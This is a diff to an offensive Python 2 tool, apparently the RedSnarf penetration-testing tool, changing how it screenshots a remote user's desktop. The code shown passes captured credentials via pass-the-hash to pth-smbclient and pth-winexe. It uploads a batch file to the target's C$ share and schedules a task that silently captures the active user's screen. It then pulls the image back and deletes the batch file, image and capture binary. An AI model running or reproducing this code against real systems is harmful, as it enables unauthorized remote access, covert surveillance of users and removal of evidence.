@@ -721,6 +721,8 @@ def datadump(user, passw, host, path, os_version):
 
 			if screenshot in yesanswers:
 				loggeduser=""
+				activeusers=0
+				
 				try:
 					print colored("[+]Attempting to Screenshot Desktop",'green')
 					
@@ -730,14 +732,25 @@ def datadump(user, passw, host, path, os_version):
 						try:
 							u = open(path+host+"/logged_on_users.txt").read().splitlines()
 							
-							for n in u:
-								if n:
-									if not "USERNAME" in n:
-										if "Active" in n:
-											loggeduser=n.lstrip()
-											endofloggeduser=loggeduser.find(" ")
-											loggeduser=loggeduser[:endofloggeduser]
-											break
+							for m in u:
+								if "Active" in m:
+									activeusers=activeusers+1
+
+							if activeusers>1:
+								print colored("[+]More than one active user was found",'blue')
+								response = raw_input('Please enter the username for the desktop you wish to capture: ')
+								
+								loggeduser=response
+							
+							if loggeduser=="":
+								for n in u:
+									if n:
+										if not "USERNAME" in n:
+											if "Active" in n:
+												loggeduser=n.lstrip()
+												endofloggeduser=loggeduser.find(" ")
+												loggeduser=loggeduser[:endofloggeduser]
+												break
 
 							if loggeduser=="":
 								print colored("[-]No logged on Active Users found: "+host,'red')
@@ -750,7 +763,7 @@ def datadump(user, passw, host, path, os_version):
 						exit(1)	
 
 					fout=open('/tmp/sshot.bat','w')
-					fout.write('SchTasks /Create /SC DAILY /RU '+loggeduser+' /TN "RedSnarf_ScreenShot" /TR "cmd.exe /c start /min c:\\rsc.exe c:\\'+host+'.png" /ST 23:36 /f\n')
+					fout.write('SchTasks /Create /SC DAILY /RU '+loggeduser+' /TN "RedSnarf_ScreenShot" /TR "cmd.exe /c start /min c:\\rsc.exe c:\\'+loggeduser+"_"+host+'.png" /ST 23:36 /f\n')
 					fout.write('SchTasks /run /TN "RedSnarf_ScreenShot" \n')
 					fout.close() 
 					
@@ -758,15 +771,15 @@ def datadump(user, passw, host, path, os_version):
 					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 					print proc.communicate()[0]
-					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+loggeduser+"_"+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 					print proc.communicate()[0]
 					
-					if os.path.isfile(outputpath+host+"/"+host+".png"):
-						print colored("[+]Screenshot file saved as "+outputpath+host+"/"+host+".png",'yellow')
+					if os.path.isfile(outputpath+host+"/"+loggeduser+"_"+host+".png"):
+						print colored("[+]Screenshot file saved as "+outputpath+host+"/"+loggeduser+"_"+host+".png",'yellow')
 					else:
 						print colored("[-]Screenshot not found, try again..",'red')
 
-					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\"+host+".png"+" c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\"+loggeduser+"_"+host+".png"+" c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 
 					time.sleep(4)
 
